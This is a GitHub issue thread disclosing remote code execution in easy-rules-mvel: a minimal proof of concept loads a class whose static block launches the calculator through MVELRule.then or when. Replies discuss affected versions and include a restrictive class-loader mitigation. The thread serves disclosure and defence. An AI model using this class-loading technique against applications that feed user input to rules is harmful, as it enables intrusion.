| easy-rules-mvel version: 4.1.0  I have run code like:  ``` try {     MVELRule mVELRule = new MVELRule();     MVELRule result = mVELRule.then("jaz.Zer"); } catch (Exception e) { } ```  Meanwhile I hava class `jaz.Zer` in classpath, which content is:  ``` import java.io.IOException;  public class Zer {     static {         try {             Runtime.getRuntime().exec("calc");         } catch (IOException e) {             throw new RuntimeException(e);         }     } } ```  On Windows platform, above code will open my PC's calculator  Additional: `MVELRule.when` also leads to this RCE  ``` try {     MVELRule mVELRule = new MVELRule();     MVELRule result = mVELRule.when("\bjaz.Zer"); } catch (Exception e) { } ``` |

| If you don't need new features 4.1.0, just downgrade to 4.0.0, it is a safe version with only a irrelevant vulnerability in `JUnit`. |

| Today a customer of ours (Veracode Application Security Consulting) ran into this vulnerability and asked us to help review as Veracode Software Composition Analysis (SCA) was blocking their release.  Veracode SCA ( <https://sca.analysiscenter.veracode.com/vulnerability-database/security/remote-code-execution/java/sid-44914/summary> ) includes earlier versions as the same functionality is also present in versions (we tracked `when` and `then` to version 3.1.0).  Reviewing this vulnerability I would agree with [@dvgaba](https://github.com/dvgaba) , this is a 'limitation' or 'feature' of MVEL. Loading arbitrary classes can be used safely, after all, this is what Java source code does, but does mean that the input would need to be subject to the same type of review that source code does. And not all developers may realize this and some may decide to use user supplied input in `when` and `then` clauses making their application vulnerable to Remote Code Execution.  Perhaps [@fmbenhassine](https://github.com/fmbenhassine) could consider restricting the class loader by default to not load any classes? In my testing the below stopped the vulnerability:  ``` import org.jeasy.rules.mvel.MVELRule; import org.mvel2.ParserConfiguration; import org.mvel2.ParserContext;  public class App  {     public static class RefusingClassLoader extends ClassLoader {         public RefusingClassLoader() {             super();         }          public RefusingClassLoader(ClassLoader parent) {             super(parent);         }          @Override         protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {             throw new ClassNotFoundException("Class loading is disabled by RefusingClassLoader: " + name);         }          @Override         public Class<?> loadClass(String name) throws ClassNotFoundException {             throw new ClassNotFoundException("Class loading is disabled by RefusingClassLoader: " + name);         }     }      public static void main( String[] args )     {         try {             ParserConfiguration config = new ParserConfiguration();             config.setClassLoader(new RefusingClassLoader());             MVELRule mVELRule = new MVELRule(new ParserContext(config));             mVELRule.then("import Zer;");             System.out.println( "mVELRule executed!" );         } catch (Exception e) {             System.out.print(e);         }         System.out.println( "Hello World!" );     } } ```  For my customer I recommended 2 things:   1. In the short term, validate that input to `MVERule.then` and `MVERule.when` is strictly controlled and it's uses have documentation to remind developers that this must always be strictly controlled. 2. In the long term, migrate to another actively developed rule engine as this appears to have been 'in maintenance mode' for 4 years: <https://github.com/j-easy/easy-rules#project-status> . |
